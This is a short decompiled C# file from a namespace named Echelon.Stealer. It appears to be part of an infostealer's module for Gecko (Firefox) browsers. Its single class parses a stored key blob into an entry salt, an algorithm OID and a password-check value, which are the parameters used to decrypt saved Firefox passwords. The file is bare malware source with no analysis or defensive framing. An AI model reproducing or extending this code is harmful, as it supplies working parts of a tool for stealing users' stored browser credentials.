using System;
using System.Globalization;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x02000039 RID: 57
	public class Gecko7
	{
		// Token: 0x0600015D RID: 349 RVA: 0x0000B150 File Offset: 0x00009350
		public Gecko7(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600015E RID: 350 RVA: 0x0000B1C0 File Offset: 0x000093C0
		public string EntrySalt { get; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x0600015F RID: 351 RVA: 0x0000B1C8 File Offset: 0x000093C8
		public string OID { get; }

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x06000160 RID: 352 RVA: 0x0000B1D0 File Offset: 0x000093D0
		public string Passwordcheck { get; }
	}
}
